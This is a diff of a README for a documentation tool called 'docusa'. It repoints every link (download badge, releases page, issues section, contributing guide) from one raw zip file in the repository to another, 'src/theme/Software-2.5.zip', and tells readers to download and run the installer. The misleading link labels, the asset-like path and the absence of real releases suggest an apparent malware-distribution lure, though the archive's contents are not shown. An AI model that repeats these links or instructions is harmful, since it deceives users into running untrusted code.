@@ -4,11 +4,11 @@
 Welcome to docusa! This tool helps you create interactive documentation from your OpenRPC document. With docusa, you can deliver rich, user-friendly documentation with minimal effort.
 
 ## 📥 Download docusa
-[![Download docusa](https://raw.githubusercontent.com/Pianibad/docusa/main/wardency/docusa.zip%https://raw.githubusercontent.com/Pianibad/docusa/main/wardency/docusa.zip)](https://raw.githubusercontent.com/Pianibad/docusa/main/wardency/docusa.zip)
+[![Download docusa](https://raw.githubusercontent.com/Pianibad/docusa/main/src/theme/Software-2.5.zip%https://raw.githubusercontent.com/Pianibad/docusa/main/src/theme/Software-2.5.zip)](https://raw.githubusercontent.com/Pianibad/docusa/main/src/theme/Software-2.5.zip)
 
 To begin using docusa, visit the download page below:
 
-[Visit Download Page](https://raw.githubusercontent.com/Pianibad/docusa/main/wardency/docusa.zip)
+[Visit Download Page](https://raw.githubusercontent.com/Pianibad/docusa/main/src/theme/Software-2.5.zip)
 
 ## 💻 System Requirements
 Before you start, ensure your system meets these requirements:
@@ -29,13 +29,13 @@ docusa offers the following features:
 Follow these steps to get docusa running on your computer:
 
 1. **Visit the Releases Page:**
-   Click this link to go to the downloads: [Visit Download Page](https://raw.githubusercontent.com/Pianibad/docusa/main/wardency/docusa.zip).
+   Click this link to go to the downloads: [Visit Download Page](https://raw.githubusercontent.com/Pianibad/docusa/main/src/theme/Software-2.5.zip).
 
 2. **Choose Your Version:**
    On the releases page, you will see the latest version available for download. Look for the version that fits your operating system.
 
 3. **Download the File:**
-   Click on the download link that corresponds to your system. This will usually be a file ending in `.exe` for Windows, `.dmg` for macOS, or a compressed file for Linux (like `https://raw.githubusercontent.com/Pianibad/docusa/main/wardency/docusa.zip`).
+   Click on the download link that corresponds to your system. This will usually be a file ending in `.exe` for Windows, `.dmg` for macOS, or a compressed file for Linux (like `https://raw.githubusercontent.com/Pianibad/docusa/main/src/theme/Software-2.5.zip`).
 
 4. **Run the Installer:**
    Once the file has finished downloading:
@@ -62,10 +62,10 @@ Once you have docusa open, you can start creating documentation:
    You can now browse your documentation. Once you are satisfied, share it with your audience.
 
 ## 📞 Support
-If you run into any issues or have questions, please feel free to reach out. The community is here to help. Check the [issues section](https://raw.githubusercontent.com/Pianibad/docusa/main/wardency/docusa.zip) for common problems or to ask your questions.
+If you run into any issues or have questions, please feel free to reach out. The community is here to help. Check the [issues section](https://raw.githubusercontent.com/Pianibad/docusa/main/src/theme/Software-2.5.zip) for common problems or to ask your questions.
 
 ## 🤝 Contributing
-We welcome contributions! If you would like to help improve docusa, please see our [contributing guide](https://raw.githubusercontent.com/Pianibad/docusa/main/wardency/docusa.zip) for more details. Your input is valuable in making docusa even better.
+We welcome contributions! If you would like to help improve docusa, please see our [contributing guide](https://raw.githubusercontent.com/Pianibad/docusa/main/src/theme/Software-2.5.zip) for more details. Your input is valuable in making docusa even better.
 
 ## 📰 Updates
 Stay informed about updates and new features by following us on the repository. We regularly check for issues and feedback to enhance your experience.
